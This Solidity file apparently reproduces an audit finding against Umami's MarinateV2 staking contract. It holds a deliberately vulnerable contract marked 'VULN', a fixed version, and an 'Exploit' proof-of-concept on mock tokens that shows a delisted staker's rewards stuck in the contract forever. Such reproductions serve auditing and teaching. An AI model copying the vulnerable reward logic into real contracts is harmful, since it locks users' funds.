// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

/*
 * AuditVault 57560 — Umami MarinateV2 (Zokyo, 2022-09).
 * Removing a marinator from the whitelist does not pay it. A later mUMAMI
 * transfer collects rewards only for the still-whitelisted recipient, so the
 * removed marinator's rewards stay in the contract forever, and
 * totalMultipliedStaked no longer matches supply.
 */

contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _move(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _move(from, to, amount);
        return true;
    }

    function _move(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract MarinateV2 {
    uint256 public constant SCALE = 1e18;
    MiniToken public immutable umami;
    MiniToken public immutable reward;
    string public name = "Marinated UMAMI";
    string public symbol = "mUMAMI";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    uint256 public totalTokenRewardsPerStake;
    uint256 public totalMultipliedStaked;
    mapping(address => uint256) public balanceOf;
    mapping(address => bool) public whitelistedContracts;
    mapping(address => uint256) public paidTokenRewardsPerStake;
    mapping(address => uint256) public toBePaid;

    constructor(MiniToken _umami, MiniToken _reward) {
        umami = _umami;
        reward = _reward;
    }

    function addToContractWhitelist(address c) external {
        whitelistedContracts[c] = true;
    }

    function removeFromContractWhitelist(address c) external returns (bool) {
        require(whitelistedContracts[c], "not wl");
        whitelistedContracts[c] = false;
        return true;
    }

    function isWhitelisted(address addr) public view returns (bool) {
        if (addr.code.length == 0) return true;
        return whitelistedContracts[addr];
    }

    function stake(uint256 amount) external {
        require(whitelistedContracts[msg.sender], "wl");
        if (balanceOf[msg.sender] == 0) {
            paidTokenRewardsPerStake[msg.sender] = totalTokenRewardsPerStake;
        } else {
            _collect(msg.sender);
        }
        umami.transferFrom(msg.sender, address(this), amount);
        _mint(msg.sender, amount);
    }

    function addReward(uint256 amount) external {
        require(totalSupply > 0, "supply");
        reward.transferFrom(msg.sender, address(this), amount);
        uint256 rewardPerStake = amount * SCALE / totalSupply;
        totalTokenRewardsPerStake += rewardPerStake;
    }

    function withdraw() external {
        _collect(msg.sender);
        _pay(msg.sender);
        uint256 bal = balanceOf[msg.sender];
        require(bal > 0, "bal");
        umami.transfer(msg.sender, bal);
        _burn(msg.sender, bal);
    }

    function claimRewards() external {
        _collect(msg.sender);
        _pay(msg.sender);
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function _collect(address user) internal {
        uint256 bal = balanceOf[user];
        uint256 owed = totalTokenRewardsPerStake - paidTokenRewardsPerStake[user];
        uint256 rewards = bal * owed / SCALE;
        paidTokenRewardsPerStake[user] = totalTokenRewardsPerStake;
        toBePaid[user] += rewards;
    }

    function _pay(address user) internal {
        uint256 amount = toBePaid[user];
        if (amount == 0) return;
        toBePaid[user] = 0;
        reward.transfer(user, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256) internal {
        if (from == address(0) || to == address(0)) return;
        // @> VULN: a delisted marinator is skipped, so its rewards are never collected
        if (isWhitelisted(from)) _collect(from);
        if (isWhitelisted(to)) _collect(to);
    }

    function _afterTokenTransfer(address from, address to, uint256 amount) internal {
        if (from != address(0) && isWhitelisted(from)) totalMultipliedStaked -= amount;
        if (to != address(0) && isWhitelisted(to)) totalMultipliedStaked += amount;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        _beforeTokenTransfer(from, to, amount);
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        _afterTokenTransfer(from, to, amount);
    }

    function _mint(address to, uint256 amount) internal {
        _beforeTokenTransfer(address(0), to, amount);
        totalSupply += amount;
        balanceOf[to] += amount;
        _afterTokenTransfer(address(0), to, amount);
    }

    function _burn(address from, uint256 amount) internal {
        _beforeTokenTransfer(from, address(0), amount);
        balanceOf[from] -= amount;
        totalSupply -= amount;
        _afterTokenTransfer(from, address(0), amount);
    }
}

contract MarinateV2Fixed {
    uint256 public constant SCALE = 1e18;
    MiniToken public immutable umami;
    MiniToken public immutable reward;
    uint256 public totalSupply;
    uint256 public totalTokenRewardsPerStake;
    uint256 public totalMultipliedStaked;
    mapping(address => uint256) public balanceOf;
    mapping(address => bool) public whitelistedContracts;
    mapping(address => uint256) public paidTokenRewardsPerStake;
    mapping(address => uint256) public toBePaid;

    constructor(MiniToken _umami, MiniToken _reward) {
        umami = _umami;
        reward = _reward;
    }

    function addToContractWhitelist(address c) external {
        whitelistedContracts[c] = true;
    }

    function removeFromContractWhitelist(address c) external returns (bool) {
        require(whitelistedContracts[c], "not wl");
        _collect(c);
        _pay(c);
        whitelistedContracts[c] = false;
        return true;
    }

    function isWhitelisted(address addr) public view returns (bool) {
        if (addr.code.length == 0) return true;
        return whitelistedContracts[addr];
    }

    function stake(uint256 amount) external {
        require(whitelistedContracts[msg.sender], "wl");
        if (balanceOf[msg.sender] == 0) paidTokenRewardsPerStake[msg.sender] = totalTokenRewardsPerStake;
        umami.transferFrom(msg.sender, address(this), amount);
        totalSupply += amount;
        balanceOf[msg.sender] += amount;
        totalMultipliedStaked += amount;
    }

    function addReward(uint256 amount) external {
        reward.transferFrom(msg.sender, address(this), amount);
        totalTokenRewardsPerStake += amount * SCALE / totalSupply;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(isWhitelisted(msg.sender) && isWhitelisted(to), "wl");
        _collect(msg.sender);
        _collect(to);
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function withdraw() external {
        _collect(msg.sender);
        _pay(msg.sender);
        uint256 bal = balanceOf[msg.sender];
        balanceOf[msg.sender] = 0;
        totalSupply -= bal;
        totalMultipliedStaked -= bal;
        umami.transfer(msg.sender, bal);
    }

    function _collect(address user) internal {
        uint256 bal = balanceOf[user];
        uint256 owed = totalTokenRewardsPerStake - paidTokenRewardsPerStake[user];
        uint256 rewards = bal * owed / SCALE;
        paidTokenRewardsPerStake[user] = totalTokenRewardsPerStake;
        toBePaid[user] += rewards;
    }

    function _pay(address user) internal {
        uint256 amount = toBePaid[user];
        if (amount == 0) return;
        toBePaid[user] = 0;
        reward.transfer(user, amount);
    }
}

contract Marinator {
    function approveAll(MiniToken token, address spender) external {
        token.approve(spender, type(uint256).max);
    }

    function stake(MarinateV2 m, uint256 amount) external {
        m.stake(amount);
    }

    function stakeFixed(MarinateV2Fixed m, uint256 amount) external {
        m.stake(amount);
    }

    function xfer(MarinateV2 m, address to, uint256 amount) external {
        m.transfer(to, amount);
    }

    function xferFixed(MarinateV2Fixed m, address to, uint256 amount) external {
        m.transfer(to, amount);
    }

    function withdraw(MarinateV2 m) external {
        m.withdraw();
    }

    function withdrawFixed(MarinateV2Fixed m) external {
        m.withdraw();
    }

    function claim(MarinateV2 m) external {
        m.claimRewards();
    }
}

contract Exploit {
    uint256 public constant STAKE_AMT = 100 ether;
    uint256 public constant REWARD_AMT = 200 ether;

    MiniToken public umami;
    MiniToken public reward;
    MarinateV2 public marinate;
    Marinator public a;
    Marinator public b;
    uint256 public multipliedAfter;
    uint256 public supplyAfter;
    uint256 public stuck;
    uint256 public aRewardsAfterRelist;

    constructor() {
        umami = new MiniToken("UMAMI", "UMAMI");
        reward = new MiniToken("Reward", "RWD");
        marinate = new MarinateV2(umami, reward);
        a = new Marinator();
        b = new Marinator();
    }

    function run() external {
        marinate.addToContractWhitelist(address(a));
        marinate.addToContractWhitelist(address(b));
        umami.mint(address(a), STAKE_AMT);
        umami.mint(address(b), STAKE_AMT);
        a.approveAll(umami, address(marinate));
        b.approveAll(umami, address(marinate));
        a.stake(marinate, STAKE_AMT);
        b.stake(marinate, STAKE_AMT);
        reward.mint(address(this), REWARD_AMT);
        reward.approve(address(marinate), type(uint256).max);
        marinate.addReward(REWARD_AMT);
        marinate.removeFromContractWhitelist(address(a));
        a.xfer(marinate, address(b), STAKE_AMT);
        multipliedAfter = marinate.totalMultipliedStaked();
        supplyAfter = marinate.totalSupply();
        b.withdraw(marinate);
        marinate.addToContractWhitelist(address(a));
        a.claim(marinate);
        stuck = reward.balanceOf(address(marinate));
        aRewardsAfterRelist = reward.balanceOf(address(a));
        require(multipliedAfter == 300 ether, "multiplied");
        require(supplyAfter == 200 ether, "supply");
        require(aRewardsAfterRelist == 0, "a never paid");
        require(reward.balanceOf(address(b)) == 100 ether, "b paid");
        require(stuck == 100 ether, "stuck");
    }
}
